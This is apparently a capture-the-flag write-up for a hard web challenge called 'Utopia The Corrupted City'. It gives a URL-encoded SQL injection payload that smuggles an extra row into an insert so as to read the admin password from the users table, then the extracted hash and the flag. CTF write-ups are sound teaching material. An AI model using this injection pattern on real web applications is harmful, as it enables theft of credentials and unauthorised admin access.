---
title: Utopia The Corrupted City
tags:
  - Web
  - SQLi
Difficulty: Hard
category: Web
---
### Description
Shall you behold my revenge :)

File Provided: public.zip

### Solution

It was very similar to the challenge in the qualifier round (writeups/Dubai Police 2025/Utopia Smart City Property Management.md). So the solution was a very similar SQLi:

`title=x%27%29%2C%28%27d%27%2C%27a%27%2C0%2C%27apartment%27%2C0%2C0%2C0%2C%27x%27%2C%27x%27%2C%28select+password+from+users+limit+1%29%29--+-`

Then, the delete property would show the output:

![[Pasted image 20251025155223.png]]

`f79f75bc3fddeda913be8ece21fedd21f3fa5a97b9609246a9244d4c7278db62` is the admin password. We can use it to login as admin and get flag:

![[Pasted image 20251025155503.png]]

flag{7ec944a059b26925}